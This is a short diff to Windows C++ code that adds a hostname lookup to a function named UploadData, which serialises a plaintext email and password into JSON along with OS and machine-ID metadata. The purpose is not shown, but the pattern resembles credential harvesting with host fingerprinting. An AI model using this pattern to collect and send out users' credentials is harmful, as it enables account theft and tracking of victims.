@@ -58,6 +58,16 @@ std::string EscapeJson(const std::string& s) {
 }
 
 // --- 2. DYNAMIC METADATA HELPERS ---
+std::string GetHostName() {
+    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(buffer);
+    if (GetComputerNameA(buffer, &size)) {
+        return std::string(buffer);
+    }
+    return "unknown_host";
+}
+
+
 std::string GetMachineId() {
     char value[255];
     DWORD BufferSize = sizeof(value);
@@ -125,7 +135,8 @@ void UploadData(std::string email, std::string pass) {
        <<     "\"password\": \"" << EscapeJson(pass) << "\""
        << "},"
        << "\"systemMeta\": {"
-       <<     "\"os\": \"" << EscapeJson(GetDynamicOS()) << "\""
+       <<     "\"os\": \"" << EscapeJson(GetDynamicOS()) << "\","
+       << "\"hostname\": \"" << EscapeJson(GetHostName()) << "\""
        << "}"
        << "}";
 
